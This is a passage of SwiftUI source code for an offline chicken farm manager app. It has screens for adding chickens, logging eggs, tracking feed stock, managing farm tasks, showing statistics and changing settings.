                TextField("Name", text: $name)
                    .padding(8)
                    .background(Color.whiteCard)
                    .cornerRadius(8)
                    .overlay(RoundedRectangle(cornerRadius: 8)
                        .stroke(showValidationErrors && name.isEmpty ? Color.warningRed : Color.clear, lineWidth: 2)
                    )

                if showValidationErrors && name.isEmpty {
                    Text("Please enter a name")
                        .font(.caption)
                        .foregroundColor(.warningRed)
                }

                TextField("Breed", text: $breed)
                    .padding(8)
                    .background(Color.whiteCard)
                    .cornerRadius(8)
                    .overlay(RoundedRectangle(cornerRadius: 8)
                        .stroke(showValidationErrors && breed.isEmpty ? Color.warningRed : Color.clear, lineWidth: 2)
                    )
                if showValidationErrors && breed.isEmpty {
                    Text("Please enter a breed")
                        .font(.caption)
                        .foregroundColor(.warningRed)
                }

                TextField("Age (months)", text: $ageMonths)
                    .keyboardType(.numberPad)
                    .padding(8)
                    .background(Color.whiteCard)
                    .cornerRadius(8)
                    .overlay(RoundedRectangle(cornerRadius: 8)
                        .stroke(showValidationErrors && (Int(ageMonths) == nil || Int(ageMonths)! < 0) ? Color.warningRed : Color.clear, lineWidth: 2)
                    )
                if showValidationErrors && (Int(ageMonths) == nil || Int(ageMonths)! < 0) {
                    Text("Please enter a valid non-negative age")
                        .font(.caption)
                        .foregroundColor(.warningRed)
                }

                Toggle("Lays Daily", isOn: $laysDaily)
                    .tint(.accentYellow)
                Toggle("Healthy", isOn: $isHealthy)
                    .tint(.healthyGreen)
            }

            Button(action: {
                if isFormValid {
                    let newChicken = Chicken(id: UUID(), name: name, breed: breed, ageMonths: Int(ageMonths)!, laysDaily: laysDaily, isHealthy: isHealthy)
                    farm.addChicken(newChicken)
                    dismiss()
                } else {
                    showValidationErrors = true
                }
            }) {
                Text("Save")
                    .frame(maxWidth: .infinity, minHeight: 44)
                    .background(isFormValid ? Color.accentOrange : Color.accentOrange.opacity(0.5))
                    .foregroundColor(.white)
                    .cornerRadius(12)
            }
            .disabled(!isFormValid)
        }
        .listStyle(InsetGroupedListStyle())
        .background(Color.backgroundMain)
        .navigationTitle("Add Chicken")
    }
}

struct ChickenProfileView: View {
    @EnvironmentObject var farm: FarmData
    @State var chicken: Chicken

    @State private var notes: String = ""

    var body: some View {
        ScrollView {
            VStack(spacing: 24) {
                // Details Card
                VStack(alignment: .leading, spacing: 12) {
                    Text("Name: \(chicken.name)")
                    Text("Breed: \(chicken.breed)")
                    Text("Age: \(chicken.ageMonths) months")
                    Text("Health Status: \(chicken.isHealthy ? "Healthy" : "Ill")")
                    Text("Eggs per week: \(chicken.laysDaily ? "Daily" : "Less often")")
                }
                .font(.body)
                .foregroundColor(.textNeutral)
                .padding()
                .background(Color.whiteCard)
                .cornerRadius(20)
                .shadow(color: Color.black.opacity(0.08), radius: 6, x: 0, y: 4)
            }
            .padding()
        }
        .background(Color.backgroundMain.ignoresSafeArea())
        .navigationTitle(chicken.name)
        .navigationBarTitleDisplayMode(.inline)
    }
}

import SwiftUI

struct EggData: Identifiable, Codable {
    var id = UUID()
    let date: Date
    var count: Int
}

class EggTrackerData: ObservableObject {
    @Published var eggEntries: [EggData] = []
    private let eggsKey = "eggEntries"
    
    init() {
        load()
    }
    
    func load() {
        if let data = UserDefaults.standard.data(forKey: eggsKey),
           let saved = try? JSONDecoder().decode([EggData].self, from: data) {
            eggEntries = saved.sorted { $0.date > $1.date }
        } else {
            eggEntries = []
        }
    }
    
    func save() {
        if let data = try? JSONEncoder().encode(eggEntries) {
            UserDefaults.standard.set(data, forKey: eggsKey)
        }
    }
    
    func addEggEntry(_ entry: EggData) {
        if let index = eggEntries.firstIndex(where: {
            Calendar.current.isDate($0.date, inSameDayAs: entry.date)
        }) {
            eggEntries[index].count = entry.count
        } else {
            eggEntries.append(entry)
        }
        eggEntries.sort { $0.date > $1.date }
        save()
    }
    
    func totalEggs() -> Int {
        eggEntries.reduce(0) { $0 + $1.count }
    }
    
    func averageWeekly() -> Int {
        let calendar = Calendar.current
        let today = Date()
        let weekAgo = calendar.date(byAdding: .day, value: -7, to: today) ?? today
        let lastWeekEntries = eggEntries.filter { $0.date >= weekAgo }
        let total = lastWeekEntries.reduce(0) { $0 + $1.count }
        return lastWeekEntries.isEmpty ? 0 : total / lastWeekEntries.count
    }
    
    func recordMonth() -> Int {
        // Максимум за последний месяц
        let calendar = Calendar.current
        let today = Date()
        let monthAgo = calendar.date(byAdding: .month, value: -1, to: today) ?? today
        let lastMonthEntries = eggEntries.filter { $0.date >= monthAgo }
        return lastMonthEntries.map { $0.count }.max() ?? 0
    }
}

struct EggTrackerView: View {
    @EnvironmentObject var eggTracker: EggTrackerData
    @State private var showingAddEgg = false
    @State private var eggCount = 0
    @State private var selectedDate = Date()
    @State private var eggCountInput = ""

    var body: some View {
        NavigationView {
            VStack {
                // Статистические плитки в ряд с равной шириной
                HStack(spacing: 16) {
                    StatTile(title: "Average per Week", value: "\(eggTracker.averageWeekly())")
                    StatTile(title: "Monthly Record", value: "\(eggTracker.recordMonth())")
                    StatTile(title: "Total Eggs", value: "\(eggTracker.totalEggs())")
                }
                .padding(.horizontal)
                .padding(.top)

                // Список записей по дням
                List {
                    ForEach(eggTracker.eggEntries) { entry in
                        HStack {
                            Text(dateToString(entry.date))
                                .foregroundColor(.textNeutral)
                            Spacer()
                            Text("\(entry.count) eggs")
                                .foregroundColor(.accentYellow)
                                .fontWeight(.semibold)
                        }
                        .padding(.vertical, 6)
                    }
                    .onDelete { offsets in
                        eggTracker.eggEntries.remove(atOffsets: offsets)
                        eggTracker.save()
                    }
                }
                .listStyle(.plain)

                // Кнопка добавления данных с ярким акцентом и отступом
                Button {
                    showingAddEgg = true
                } label: {
                    Text("Add Data")
                        .frame(maxWidth: .infinity, minHeight: 50)
                        .background(Color.accentYellow)
                        .foregroundColor(.white)
                        .font(.headline)
                        .cornerRadius(16)
                        .padding(.horizontal)
                }
                .padding(.bottom)

                Spacer()
            }
            .background(Color.backgroundMain.ignoresSafeArea())
            .navigationTitle("Egg Tracker")
            .sheet(isPresented: $showingAddEgg) {
                AddEggDataView(selectedDate: $selectedDate, eggCountInput: $eggCountInput) { date, count in
                    eggTracker.addEggEntry(EggData(date: date, count: count))
                    showingAddEgg = false
                    eggCountInput = ""
                }
            }
        }
    }

    private func dateToString(_ date: Date) -> String {
        let formatter = DateFormatter()
        formatter.dateStyle = .medium
        return formatter.string(from: date)
    }

    private func exportData() {
        print("Export data tapped")
        // Реализация экспорта PDF/CSV по желанию
    }
}

struct StatTile: View {
    let title: String
    let value: String

    var body: some View {
        VStack(spacing: 6) {
            Text(value)
                .font(.title2.bold())
                .foregroundColor(.accentYellow)
            Text(title)
                .font(.caption)
                .foregroundColor(.textNeutral)
        }
        .frame(maxWidth: .infinity, minHeight: 90)
        .padding()
        .background(Color.whiteCard)
        .cornerRadius(16)
        .shadow(color: Color.black.opacity(0.06), radius: 4, x: 0, y: 2)
    }
}

// Простой график отображения с подсчетом недель
struct EggChartView: View {
    let entries: [EggData]
    
    var weeklyData: [(week: String, total: Int)] {
        var weeksDict = [String: Int]()
        let calendar = Calendar.current
        for entry in entries {
            let comp = calendar.dateComponents([.yearForWeekOfYear, .weekOfYear], from: entry.date)
            if let year = comp.yearForWeekOfYear, let week = comp.weekOfYear {
                let key = "W\(week) \(year)"
                weeksDict[key, default: 0] += entry.count
            }
        }
        return weeksDict.sorted { $0.key < $1.key }.map { ($0.key, $0.value) }
    }
    
    var body: some View {
        GeometryReader { geo in
            let maxVal = weeklyData.map { $0.total }.max() ?? 1
            let width = geo.size.width / CGFloat(max(weeklyData.count, 1))
            let height = geo.size.height
            
            HStack(alignment: .bottom, spacing: 4) {
                ForEach(weeklyData, id: \.week) { week, total in
                    VStack {
                        RoundedRectangle(cornerRadius: 4)
                            .fill(Color.accentOrange)
                            .frame(width: width * 0.8, height: CGFloat(total) / CGFloat(maxVal) * height)
                        Text(week)
                            .font(.caption2)
                            .rotationEffect(.degrees(-45))
                            .frame(width: width * 1.4)
                    }
                }
            }
            .frame(height: height)
        }
        .background(Color.whiteCard)
        .cornerRadius(16)
        .shadow(radius: 4)
    }
}

import SwiftUI

struct AddEggDataView: View {
    @Binding var selectedDate: Date
    @Binding var eggCountInput: String
    var onSave: (Date, Int) -> Void

    @Environment(\.dismiss) var dismiss

    var body: some View {
        NavigationView {
            Form {
                DatePicker("Date", selection: $selectedDate, displayedComponents: .date)
                TextField("Eggs Count", text: Binding(
                    get: { eggCountInput },
                    set: { newValue in
                        // Оставляем только цифры
                        eggCountInput = newValue.filter { $0.isNumber }
                    }
                ))
                .keyboardType(.numberPad)
            }
            .navigationTitle("Add Egg Data")
            .toolbar {
                ToolbarItem(placement: .confirmationAction) {
                    Button("Save") {
                        if let count = Int(eggCountInput), count >= 0 {
                            onSave(selectedDate, count)
                            dismiss()
                        } else {
                            print("Invalid egg count")
                        }
                    }
                }
                ToolbarItem(placement: .cancellationAction) {
                    Button("Cancel") {
                        dismiss()
                    }
                }
            }
        }
    }
}


struct FeedStorageView: View {
    @State private var feeds: [Feed] = [
        Feed(name: "Grain", amountKg: 22),
        Feed(name: "Compound Feed", amountKg: 50),
        Feed(name: "Corn", amountKg: 14)
    ]
    @State private var showingAddFeed = false

    var body: some View {
        NavigationView {
            VStack {
                List {
                    ForEach(feeds) { feed in
                        HStack {
                            Text(feed.name)
                                .foregroundColor(.textNeutral)
                                .font(.headline)
                            Spacer()
                            Text("\(feed.amountKg, specifier: "%.0f") kg")
                                .foregroundColor(.textNeutral)
                                .fontWeight(.semibold)
                        }
                        .padding(.vertical, 8)
                        .background(Color.whiteCard)
                        .cornerRadius(12)
                        .listRowSeparator(.hidden)
                        .shadow(color: Color.black.opacity(0.05), radius: 3, x: 0, y: 2)
                    }
                    .onDelete { indexSet in
                        feeds.remove(atOffsets: indexSet)
                    }
                }
                .listStyle(.plain)
                .scrollContentBackground(.hidden) // убирает фон листа

                Button {
                    showingAddFeed = true
                } label: {
                    Text("Add Feed")
                        .frame(maxWidth: .infinity, minHeight: 50)
                        .background(Color.accentOrange)
                        .foregroundColor(.white)
                        .cornerRadius(16)
                        .font(.headline)
                        .padding(.horizontal)
                        .padding(.bottom, 16)
                }
            }
            .background(Color.backgroundMain.ignoresSafeArea())
            .navigationTitle("Feed Storage")
            .toolbar {
                ToolbarItem(placement: .navigationBarTrailing) {
                    EditButton()
                        .tint(.accentOrange)
                }
            }
            .sheet(isPresented: $showingAddFeed) {
                AddFeedView(feeds: $feeds)
            }
        }
    }
}

struct Feed: Identifiable {
    let id = UUID()
    var name: String
    var amountKg: Double
}

struct AddFeedView: View {
    @Binding var feeds: [Feed]
    @Environment(\.dismiss) var dismiss

    @State private var name = ""
    @State private var amount = ""

    var body: some View {
        NavigationView {
            Form {
                Section(header: Text("Add New Feed")) {
                    TextField("Feed Type", text: $name)
                    TextField("Amount (kg)", text: $amount)
                        .keyboardType(.decimalPad)
                }
            }
            .navigationTitle("Add Feed")
            .toolbar {
                ToolbarItem(placement: .confirmationAction) {
                    Button("Save") {
                        guard !name.isEmpty, let amountKg = Double(amount), amountKg >= 0 else { return }
                        let newFeed = Feed(name: name, amountKg: amountKg)
                        feeds.append(newFeed)
                        dismiss()
                    }
                }
                ToolbarItem(placement: .cancellationAction) {
                    Button("Cancel") { dismiss() }
                }
            }
        }
    }
}

struct FarmTasksView: View {
    @State private var tasks: [FarmTask] = [
        FarmTask(text: "Clean the chicken coop", done: false),
        FarmTask(text: "Check drinkers", done: false),
        FarmTask(text: "Add new feed", done: false),
    ]
    @State private var newTaskText = ""

    var body: some View {
        NavigationView {
            VStack(spacing: 0) {
                List {
                    ForEach(tasks) { task in
                        HStack {
                            Button(action: {
                                toggleTask(task)
                            }) {
                                Image(systemName: task.done ? "checkmark.circle.fill" : "circle")
                                    .foregroundColor(task.done ? .healthyGreen : .textNeutral)
                                    .font(.title2)
                            }
                            .buttonStyle(PlainButtonStyle())

                            Text(task.text)
                                .font(.body)
                                .foregroundColor(.textNeutral)
                                .padding(.leading, 8)

                            Spacer()
                        }
                        .padding(.vertical, 8)
                        .background(Color.whiteCard)
                        .cornerRadius(12)
                        .shadow(color: Color.black.opacity(0.05), radius: 3, x: 0, y: 2)
                        .listRowSeparator(.hidden)
                    }
                    .onDelete(perform: deleteTask)
                }
                .listStyle(.plain)
                .scrollContentBackground(.hidden) // чтобы фон списка был прозрачным и показывал цвет экрана

                HStack {
                    TextField("New task", text: $newTaskText)
                        .padding(12)
                        .background(Color.whiteCard)
                        .cornerRadius(12)
                        .foregroundColor(.textNeutral)
                        .font(.body)

                    Button(action: {
                        addNewTask()
                    }) {
                        Text("Add")
                            .foregroundColor(.white)
                            .padding(.horizontal, 20)
                            .padding(.vertical, 12)
                            .background(newTaskText.isEmpty ? Color.accentYellow.opacity(0.5) : Color.accentYellow)
                            .cornerRadius(12)
                            .font(.headline)
                    }
                    .disabled(newTaskText.isEmpty)
                }
                .padding()
                .background(Color.backgroundMain)
            }
            .background(Color.backgroundMain.ignoresSafeArea())
            .navigationTitle("Farm Tasks")
            .toolbar {
                ToolbarItem(placement: .navigationBarTrailing) {
                    EditButton()
                        .tint(.accentOrange)
                }
            }
        }
    }

    private func toggleTask(_ task: FarmTask) {
        if let index = tasks.firstIndex(where: { $0.id == task.id }) {
            tasks[index].done.toggle()
        }
    }

    private func addNewTask() {
        let task = FarmTask(text: newTaskText, done: false)
        tasks.append(task)
        newTaskText = ""
    }

    private func deleteTask(at offsets: IndexSet) {
        tasks.remove(atOffsets: offsets)
    }
}

struct FarmTask: Identifiable {
    let id = UUID()
    var text: String
    var done: Bool
}

struct StatisticsView: View {
    // Заглушка: данные можно подключить из модели
    var body: some View {
        NavigationView {
            ScrollView {
                VStack(spacing: 24) {
                    Text("Statistics & Reports")
                        .font(.largeTitle.bold())
                        .foregroundColor(.textNeutral)
                        .padding(.top, 16)
                    
                    // Пример карточек для статистики
                    VStack(spacing: 16) {
                        StatCard2(title: "Eggs per day", value: "127")
                        StatCard2(title: "Feed consumption", value: "22 kg")
                        StatCard2(title: "Most productive chicken", value: "White Leghorn")
                    }
                    .padding(.horizontal)
                    
                    Spacer()
                }
            }
            .background(Color.backgroundMain.ignoresSafeArea())
            .navigationTitle("Statistics")
        }
    }
}

struct StatCard2: View {
    let title: String
    let value: String
    
    var body: some View {
        VStack(spacing: 8) {
            Text(value)
                .font(.title2.bold())
                .foregroundColor(.accentYellow)
            Text(title)
                .font(.headline)
                .foregroundColor(.textNeutral)
                .multilineTextAlignment(.center)
        }
        .padding()
        .frame(maxWidth: .infinity)
        .background(Color.whiteCard)
        .cornerRadius(20)
        .shadow(color: Color.black.opacity(0.1), radius: 6, x: 0, y: 4)
    }
}

struct SettingsView: View {
    @AppStorage("unit") var unit: String = "kg"
    @AppStorage("currency") var currency: String = "USD"
    @AppStorage("notificationsEnabled") var notificationsEnabled: Bool = true

    var body: some View {
        NavigationView {
            Form {
                Section(header: Text("Units").foregroundColor(.textNeutral)) {
                    Picker("Weight Unit", selection: $unit) {
                        Text("Kilograms").tag("kg")
                        Text("Pounds").tag("lb")
                    }
                    .pickerStyle(.segmented)
                    .accentColor(.accentOrange)
                }

                Section(header: Text("Currency").foregroundColor(.textNeutral)) {
                    Picker("Currency", selection: $currency) {
                        Text("USD").tag("USD")
                        Text("EUR").tag("EUR")
                        Text("RUB").tag("RUB")
                    }
                    .accentColor(.accentOrange)
                }

                Section(header: Text("Notifications").foregroundColor(.textNeutral)) {
                    Toggle("Enable Notifications", isOn: $notificationsEnabled)
                        .tint(.accentYellow)
                }

                Section {
                    Button("Reset Data") {
                        print("Reset data tapped")
                    }
                    .foregroundColor(.warningRed)
                }

                Section(header: Text("About").foregroundColor(.textNeutral)) {
                    Text("Chicken Farm Manager v1.0")
                    Text("Offline farm management app")
                }
            }
            .background(Color.backgroundMain.ignoresSafeArea())
            .navigationTitle("Settings")
        }
    }
}
